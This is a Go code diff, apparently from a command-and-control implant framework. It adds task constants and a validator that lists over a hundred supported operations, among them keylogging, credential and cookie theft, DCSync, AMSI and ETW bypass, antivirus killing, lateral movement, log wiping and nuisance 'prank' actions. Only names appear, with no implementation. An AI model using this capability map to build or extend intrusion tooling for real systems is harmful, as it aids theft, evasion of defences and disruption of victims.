@@ -135,6 +135,7 @@ const (
 	TaskTypeBlockDLLs        = "blockdlls"
 	TaskTypeUnhookNtdll      = "unhook_ntdll"
 	TaskTypeProtectProcess   = "protect_process"
+	TaskTypeRunEvasion       = "run_evasion"
 	TaskTypeCleanup          = "cleanup"
 	TaskTypeLogWipe          = "log_wipe"
 	TaskTypeTrackWipe        = "track_wipe"
@@ -204,8 +205,8 @@ const (
 	TaskTypeContainerK8s    = "container_k8s"
 
 	// Sleep Mask Kit
-	TaskTypeSetSleepMask          = "set_sleep_mask"
-	TaskTypeSetSleepMaskAdvanced  = "set_sleep_mask_advanced"
+	TaskTypeSetSleepMask         = "set_sleep_mask"
+	TaskTypeSetSleepMaskAdvanced = "set_sleep_mask_advanced"
 
 	// Sandbox Detection
 	TaskTypeSandboxDetect         = "sandbox_detect"
@@ -239,4 +240,259 @@ const (
 	TaskTypeBronzeBit        = "bronze_bit"
 	TaskTypeAdminSDHolder    = "adminsdholder"
 	TaskTypeDCSyncMachine    = "dcsync_machine"
+
+	// Crypto Key Rotation
+	TaskTypeKeyRotate = "key_rotate"
+
+	// Prank / Fun Tasks
+	TaskTypeWallpaperChange = "wallpaper_change"
+	TaskTypeMsgBox          = "msgbox"
+	TaskTypePlaySound       = "play_sound"
+	TaskTypeOpenURL         = "open_url"
+	TaskTypeScreenRotate    = "screen_rotate"
+	TaskTypeCDRomTray       = "cdrom_tray"
+	TaskTypeNotepadSpam     = "notepad_spam"
+	TaskTypeLockWorkstation = "lock_workstation"
+	TaskTypeSetVolume       = "set_volume"
+	TaskTypeCursorFlip      = "cursor_flip"
+
+	// Process Tree
+	TaskTypeProcessTree = "process_tree"
 )
+
+// AllTaskTypes returns every defined task type constant in a deduplicated slice.
+func AllTaskTypes() []string {
+	return []string{
+		TaskTypeShell,
+		TaskTypePS,
+		TaskTypeScreenshot,
+		TaskTypeScreenshotWin,
+		TaskTypeScreenStreamSt,
+		TaskTypeScreenStreamSp,
+		TaskTypeKeylogStart,
+		TaskTypeKeylogStop,
+		TaskTypeKeylogDump,
+		TaskTypeSuspend,
+		TaskTypeResume,
+		TaskTypeKillProc,
+		TaskTypeClipboardGet,
+		TaskTypeClipboardSet,
+		TaskTypeFind,
+		TaskTypeRegGet,
+		TaskTypeRegSet,
+		TaskTypeRegDelete,
+		TaskTypeReboot,
+		TaskTypeShutdown,
+		TaskTypeDrives,
+		TaskTypeBeaconNow,
+		TaskTypeServices,
+		TaskTypePortscan,
+		TaskTypeNetstat,
+		TaskTypeUsers,
+		TaskTypeAV,
+		TaskTypeDownloadURL,
+		TaskTypeUninstall,
+		TaskTypeSetSleep,
+		TaskTypeCreds,
+		TaskTypeInject,
+		TaskTypeInjectMethods,
+		TaskTypeListInjectMeth,
+		TaskTypeSpawn,
+		TaskTypeShinject,
+		TaskTypeShspawn,
+		TaskTypeLateral,
+		TaskTypeLateralWMI,
+		TaskTypeLateralWinRM,
+		TaskTypeLateralPsexec,
+		TaskTypeLateralDCOM,
+		TaskTypeLateralSCF,
+		TaskTypeLateralList,
+		TaskTypeNetScanSMB,
+		TaskTypeNetEnumHosts,
+		TaskTypeSocks,
+		TaskTypeKillAV,
+		TaskTypeElevate,
+		TaskTypeBOF,
+		TaskTypeElevatePN,
+		TaskTypeExecAssembly,
+		TaskTypeKerberoast,
+		TaskTypeMimikatz,
+		TaskTypeDPAPIMasterKey,
+		TaskTypeDPAPIBlob,
+		TaskTypeDPAPIBrowser,
+		TaskTypeLSABypass,
+		TaskTypeADCSFind,
+		TaskTypeADCSRequest,
+		TaskTypeShadowCreds,
+		TaskTypeLDAPUsers,
+		TaskTypeLDAPGroups,
+		TaskTypeLDAPComputers,
+		TaskTypeLDAPSPN,
+		TaskTypeLDAPACL,
+		TaskTypeLDAPQuery,
+		TaskTypeLS,
+		TaskTypeDelete,
+		TaskTypeRead,
+		TaskTypeDownload,
+		TaskTypeUpload,
+		TaskTypeNet,
+		TaskTypePowerpick,
+		TaskTypePELoader,
+		TaskTypeExecAssemblyFR,
+		TaskTypeRPortFwdStart,
+		TaskTypeRPortFwdStop,
+		TaskTypeDCSync,
+		TaskTypeGoldenTicket,
+		TaskTypeSilverTicket,
+		TaskTypeASREPRoast,
+		TaskTypePassTheHash,
+		TaskTypePassTheTicket,
+		TaskTypePersistenceAdd,
+		TaskTypePersistenceList,
+		TaskTypePersistenceRem,
+		TaskTypeBrowserSteal,
+		TaskTypeCookieExport,
+		TaskTypeVPNCreds,
+		TaskTypeWifiCreds,
+		TaskTypePrivescCheck,
+		TaskTypeRemoteInput,
+		TaskTypeUACBypass,
+		TaskTypeAMSIByPass,
+		TaskTypeETWByPass,
+		TaskTypeETWNtraceBypass,
+		TaskTypeAMSISessionByp,
+		TaskTypeBlockDLLs,
+		TaskTypeUnhookNtdll,
+		TaskTypeProtectProcess,
+		TaskTypeRunEvasion,
+		TaskTypeCleanup,
+		TaskTypeLogWipe,
+		TaskTypeTrackWipe,
+		TaskTypeSelfDelete,
+		TaskTypeKill,
+		TaskTypeSelfUpdate,
+		TaskTypeReflectDLLInject,
+		TaskTypeCoercePrinterBug,
+		TaskTypeCoercePetitPotam,
+		TaskTypeCoerceDFS,
+		TaskTypeRelayNTLMStart,
+		TaskTypeRelayNTLMStop,
+		TaskTypeNTLMHelp,
+		TaskTypeMacroExecute,
+		TaskTypeCertStoreList,
+		TaskTypeCLRExecAssembly,
+		TaskTypeCLRPowerShell,
+		TaskTypeRunEgress,
+		TaskTypeSharpHound,
+		TaskTypeSetC2Mode,
+		TaskTypeInteractiveShellStart,
+		TaskTypeInteractiveShellWrite,
+		TaskTypeInteractiveShellStop,
+		TaskTypeShellOutput,
+		TaskTypeTunnelAddRoute,
+		TaskTypeTunnelRemoveRoute,
+		TaskTypeGossipDiscover,
+		TaskTypeChromeC2,
+		TaskTypeChromeExec,
+		TaskTypeChromeScript,
+		TaskTypeChromeCookies,
+		TaskTypeChromeBookmarks,
+		TaskTypeChromeHistory,
+		TaskTypeChromeTabs,
+		TaskTypeChromeDownload,
+		TaskTypeChromeStorage,
+		TaskTypeChromeScreenshot,
+		TaskTypeChromeClipboard,
+		TaskTypeChromeIdle,
+		TaskTypeContainerDetect,
+		TaskTypeContainerEscape,
+		TaskTypeContainerDocker,
+		TaskTypeContainerK8s,
+		TaskTypeSetSleepMask,
+		TaskTypeSetSleepMaskAdvanced,
+		TaskTypeSandboxDetect,
+		TaskTypeSandboxDetectAdvanced,
+		TaskTypeAMSIHardwareBP,
+		TaskTypeETWHardwareBP,
+		TaskTypeSetWorkingHours,
+		TaskTypeSetKillDate,
+		TaskTypeClearKillDate,
+		TaskTypeBOFInfection,
+		TaskTypeEvasionKernelCallback,
+		TaskTypeEvasionETWTI,
+		TaskTypeEvasionEnumCallbacks,
+		TaskTypeEvasionObjCB,
+		TaskTypeEvasionImgLoad,
+		TaskTypeFindDelegation,
+		TaskTypeConstrainedDeleg,
+		TaskTypeRBCD,
+		TaskTypeBronzeBit,
+		TaskTypeAdminSDHolder,
+		TaskTypeDCSyncMachine,
+		TaskTypeTokenListProcs,
+		TaskTypeTokenSteal,
+		TaskTypeTokenMake,
+		TaskTypeTokenRevert,
+		TaskTypeRev2Self,
+		TaskTypeTokenWhoami,
+		TaskTypeNamedPipeImp,
+		TaskTypeJuicyPotato,
+		TaskTypeFodhelper,
+		TaskTypeSlui,
+		TaskTypeEventvwr,
+		TaskTypeComputerDefaults,
+		TaskTypeSSHLateral,
+		TaskTypeSSHKeygen,
+		TaskTypeSSHTunnel,
+		TaskTypeSCPUpload,
+		TaskTypeCloudSteal,
+		TaskTypeADCSESC1,
+		TaskTypeADCSESC2,
+		TaskTypeADCSESC3,
+		TaskTypeADCSESC4,
+		TaskTypeADCSESC5,
+		TaskTypeADCSESC6,
+		TaskTypeADCSESC7,
+		TaskTypeADCSESC8,
+		TaskTypeADCSFullAudit,
+		TaskTypeSetSleepMode,
+		TaskTypeGetSleepMode,
+		TaskTypeProfileRotate,
+		TaskTypeConfigPush,
+		TaskTypeEdrStatus,
+		TaskTypeGhostModeStatus,
+		TaskTypeGhostModeExit,
+		TaskTypeKeyRotate,
+
+		// Prank / Fun Tasks
+		TaskTypeWallpaperChange,
+		TaskTypeMsgBox,
+		TaskTypePlaySound,
+		TaskTypeOpenURL,
+		TaskTypeScreenRotate,
+		TaskTypeCDRomTray,
+		TaskTypeNotepadSpam,
+		TaskTypeLockWorkstation,
+		TaskTypeSetVolume,
+		TaskTypeCursorFlip,
+
+		// Process Tree
+		TaskTypeProcessTree,
+	}
+}
+
+var validTaskTypeSet map[string]struct{}
+
+func init() {
+	types := AllTaskTypes()
+	validTaskTypeSet = make(map[string]struct{}, len(types))
+	for _, t := range types {
+		validTaskTypeSet[t] = struct{}{}
+	}
+}
+
+// ValidTaskType returns true if the given type is a known task type constant.
+func ValidTaskType(t string) bool {
+	_, ok := validTaskTypeSet[t]
+	return ok
+}
